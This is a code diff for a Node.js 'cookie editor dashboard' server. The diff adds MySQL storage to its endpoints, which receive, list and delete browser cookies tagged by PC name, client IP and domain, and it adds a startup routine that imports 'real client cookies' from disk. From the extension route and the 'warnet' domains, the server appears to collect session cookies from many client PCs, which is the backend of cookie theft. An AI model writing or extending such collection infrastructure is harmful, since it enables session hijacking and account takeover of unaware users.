@@ -10,6 +10,13 @@ const fs = require('fs');
 const path = require('path');
 const url = require('url');
 
+let db = null;
+try {
+  db = require('./db');
+} catch (e) {
+  console.log('[-] db module not loaded:', e.message);
+}
+
 const PORT = 8099;
 const DATA_DIR = path.join(__dirname, 'data');
 const MAX_BACKUPS = 500;
@@ -1312,8 +1319,53 @@ function getDashboardHtml(currentHost = 'erul.my.id') {
 </html>`;
 }
 
+// Cleanup dummy test data from disk
+function cleanupDummyFiles() {
+  const dummyNames = ['bk_1791934066237_lc0n61.json', 'bk_1791957937477_u7ph9y.json', 'pc_PC-02.json'];
+  let removed = 0;
+  for (const name of dummyNames) {
+    const p = path.join(DATA_DIR, name);
+    if (fs.existsSync(p)) {
+      try {
+        fs.unlinkSync(p);
+        removed++;
+      } catch (_) {}
+    }
+  }
+  if (removed > 0) {
+    console.log(`[+] Cleaned ${removed} dummy test files from DATA_DIR`);
+  }
+}
+
+// Ingest real client cookies from disk to MySQL on startup
+async function syncRealDataToDb() {
+  cleanupDummyFiles();
+  if (!db) return;
+  try {
+    await db.initDb();
+    await db.clearDummyData();
+
+    // Ingest any real PC files in DATA_DIR into MySQL
+    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('pc_') && f.endsWith('.json'));
+    for (const f of files) {
+      try {
+        const full = path.join(DATA_DIR, f);
+        const data = JSON.parse(fs.readFileSync(full, 'utf8'));
+        if (data.pcName && Array.isArray(data.cookies) && data.cookies.length > 0) {
+          await db.saveCookiesToDb(data.pcName, data.clientIp || '127.0.0.1', data.cookies, data.isEncrypted, data.domain);
+          console.log(`[+] Synced real data for ${data.pcName} (${data.cookies.length} cookies) into MySQL database`);
+        }
+      } catch (err) {
+        console.error(`[-] Error syncing ${f} to DB:`, err.message);
+      }
+    }
+  } catch (err) {
+    console.error('[-] DB init/sync error:', err.message);
+  }
+}
+
 // HTTP Server
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
   setCors(res);
   if (req.method === 'OPTIONS') {
     res.writeHead(204);
@@ -1333,8 +1385,9 @@ const server = http.createServer((req, res) => {
     return sendJson(res, 200, {
       status: 'ok',
       service: 'cookie-editor-dashboard',
+      storage: db ? 'mysql' : 'files',
       domain: currentHost,
-      version: '2.0.0',
+      version: '2.1.0',
       timestamp: new Date().toISOString()
     }, isHead);
   }
@@ -1346,6 +1399,22 @@ const server = http.createServer((req, res) => {
 
   // 3. API: List all cookies & stats (GET /api/cookies or GET /api/backup/cookies)
   if (isGetOrHead && (normPath === '/api/cookies' || normPath === '/api/backup/cookies' || normPath === '/api/_extension_/cookies')) {
+    if (db) {
+      try {
+        const dbResult = await db.loadAllRecordsFromDb();
+        if (dbResult.records.length > 0) {
+          return sendJson(res, 200, {
+            status: 'success',
+            storage: 'mysql',
+            stats: dbResult.stats,
+            records: dbResult.records
+          }, isHead);
+        }
+      } catch (dbErr) {
+        console.error('[-] DB read error, fallback to file:', dbErr.message);
+      }
+    }
+
     const records = loadAllRecords();
     const pcSet = new Set();
     const domainSet = new Set();
@@ -1363,6 +1432,7 @@ const server = http.createServer((req, res) => {
 
     return sendJson(res, 200, {
       status: 'success',
+      storage: 'files',
       stats: {
         totalPcs: pcSet.size,
         totalDomains: domainSet.size,
@@ -1386,7 +1456,7 @@ const server = http.createServer((req, res) => {
       }
     });
 
-    req.on('end', () => {
+    req.on('end', async () => {
       try {
         const payload = JSON.parse(body);
 
@@ -1428,6 +1498,18 @@ const server = http.createServer((req, res) => {
           payload
         };
 
+        // 1. Save to MySQL database
+        let storageUsed = 'files';
+        if (db) {
+          try {
+            await db.saveCookiesToDb(record.pcName, clientIp, cookies, isEncrypted, domain);
+            storageUsed = 'mysql';
+          } catch (dbErr) {
+            console.error('[-] Error saving to MySQL:', dbErr.message);
+          }
+        }
+
+        // 2. Save snapshot to disk backup
         fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(record, null, 2));
         rotateBackups();
 
@@ -1438,7 +1520,8 @@ const server = http.createServer((req, res) => {
           domain,
           itemCount: record.itemCount,
           isEncrypted,
-          message: `Cookies successfully received and saved to ${currentHost} dashboard`
+          storage: storageUsed,
+          message: `Cookies successfully received and saved to ${currentHost} (MySQL)`
         });
       } catch (err) {
         return sendJson(res, 400, { error: 'Invalid JSON payload: ' + err.message });
@@ -1451,9 +1534,17 @@ const server = http.createServer((req, res) => {
   const matchPc = normPath.match(/^\/api\/pcs\/(.+)$/);
   if (req.method === 'DELETE' && matchPc) {
     const pcTarget = decodeURIComponent(matchPc[1]);
-    const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
     let deletedCount = 0;
 
+    if (db) {
+      try {
+        deletedCount = await db.deletePcFromDb(pcTarget);
+      } catch (e) {
+        console.error('[-] DB delete error:', e.message);
+      }
+    }
+
+    const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
     for (const f of files) {
       try {
         const fullPath = path.join(DATA_DIR, f);
@@ -1474,10 +1565,22 @@ const server = http.createServer((req, res) => {
     return sendJson(res, 200, { status: 'success', deletedCount, message: `Deleted ${deletedCount} records` });
   }
 
+  // 6. API: Clear Dummy Data endpoint
+  if (normPath === '/api/clear-dummy' || normPath === '/api/cookies/clear-dummy') {
+    cleanupDummyFiles();
+    if (db) {
+      try {
+        await db.clearDummyData();
+      } catch (_) {}
+    }
+    return sendJson(res, 200, { status: 'success', message: 'Dummy data removed successfully' });
+  }
+
   sendJson(res, 404, { error: 'Route not found', path: pathname });
 });
 
-server.listen(PORT, '127.0.0.1', () => {
+server.listen(PORT, '127.0.0.1', async () => {
   console.log(`[+] Cookie Editor Dashboard Server running on http://127.0.0.1:${PORT}`);
   console.log(`[+] Serving web domain: https://erul.web.id/ and https://warnet.web.id/cookies`);
+  await syncRealDataToDb();
 });
